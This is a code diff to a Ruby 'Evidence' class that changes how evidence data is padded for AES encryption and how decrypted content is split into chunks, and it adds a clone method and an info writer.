@@ -9,9 +9,9 @@ require_relative 'utf16le'
 
 # RCS::Common
 require 'rcs-common/crypt'
+require 'rcs-common/stringio'
 
 # system
-require 'stringio'
 require 'securerandom'
 
 # evidence types
@@ -36,10 +36,14 @@ class Evidence
   attr_reader :info
   attr_reader :version
   attr_reader :type
-  attr_reader :info
+  attr_writer :info
   
   def self.VERSION_ID
     2008121901
+  end
+
+  def clone
+    return Evidence.new(@key, @info)
   end
   
   def initialize(key, info = {})
@@ -84,7 +88,7 @@ class Evidence
   end
   
   def encrypt(data)
-    rest = align_to_block_len(data.size) - data.size
+    rest = align_to_block_len(data.bytesize) - data.bytesize
     data += "a" * rest
     return aes_encrypt(data, @key, PAD_NOPAD)
   end
@@ -194,16 +198,14 @@ class Evidence
     end
     
     # split content to chunks
-    @info[:content] = ''
+    @info[:chunks] = []
     while not binary_string.eof?
       len = read_uint32(binary_string)
       content = binary_string.read align_to_block_len(len)
-      @info[:content] += StringIO.new( decrypt(content) ).read(len)
+      @info[:chunks] << StringIO.new( decrypt(content) ).read(len)
     end
     
-    decode_content if respond_to? :decode_content
-    
-    return self
+    return decode_content
   end
   
 end
